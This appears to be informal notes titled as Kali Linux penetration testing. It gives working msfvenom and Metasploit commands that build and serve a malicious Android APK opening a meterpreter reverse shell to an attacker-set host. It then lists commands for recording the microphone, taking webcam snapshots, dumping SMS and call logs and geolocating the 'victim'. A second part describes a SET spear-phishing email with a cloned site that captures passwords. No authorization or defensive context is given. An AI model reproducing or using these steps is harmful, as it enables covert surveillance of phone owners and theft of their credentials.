Penetration testing om Kali Linux

/* For starters make a directory for a better storing and convenience for further steps */
mkdir Test

/*Then we enter the new directory*/
cd Test

/*Generate the payload-like file*/
msfvenom -p android/meterpreter/reverse_tcp LHOST=<attacker's IP address> LPORT=<the port ypu want to initialize a listener> R > pentest.apk

/* We use the msfvenom for the generation of the payload and since the targeted devices are mobile phones we state that the OS should be android
  (it works on all Linux based mobile OS, though), sepecify that we work the meterpreter tool of Metasploit and that we would initialize a 
  listener and connect back to our device to exploit the victim. We set the attacker's IP and port to listen on. Finally, save the generated 
  payload in a file ( R > is used to prevent the encripted payload to show in the terminal)
*/

/* Then we open the msfconsole to let the magic happen */
msfconsole

/*We use multihandler so as to avoid the default payload*/
use multi/handler

/* And now we configure the one ad the payload's one above */
set payload android/meterpreter/reverse_tcp

/* To see if the IP and port are already set we use 'show options'*/
show options

/* And if not we set the manually*/
set LHOST <attacker's IP>
set LPORT <port number>

/* We start the listener*/
run 
/*or we can also use*/
exploit

/* In my case I host a local server for the 'app' that the victim should install...btw here the separate directory form the beginning comes in handy*/
cd Test
python3 -m http.server

/* after the 'app' has been dowloaded, the session should start and now we have various commands to interact with the victim device
  I believe that it is not necessary to write what every one of them does...they sepak for themselves
*/
record_mic
webcam_snap
dump_calllog
dump_sms
send_sms
geolocate
etc.


/*For the second part I use SET toolkit for our little phishing show*/
setoolkit

/*here we have different options that are chosen by numbers and there are no actual commands so I will just shortly describe the steps necessary*/

/*
  I am using a 'mass mailer attack' and 'spear phishing attack' method. Even though I have conducted the test to only one account...nevermind.
  Here the toolkit provides the following. In the terminal we have som steps to write an email. Step by step we are asked to write the email 
  of the victim, our email(of course not the real one). The theme and the body of the email. Then we can set if the email is of 'high priority'
  In the body of the email I have added a link made with 'website attack vectors' that initiates a listener when the victim opens it. It copies 
  the UI of a website and attaches the lsitener to the copied site's IP. I set am alternative text of the link as 'Verify password' and after the
  victim entered their credentials(email and password) I got them in th einitialised listener in the terminal.

/* The grand finale...Social engineering is awesome*/
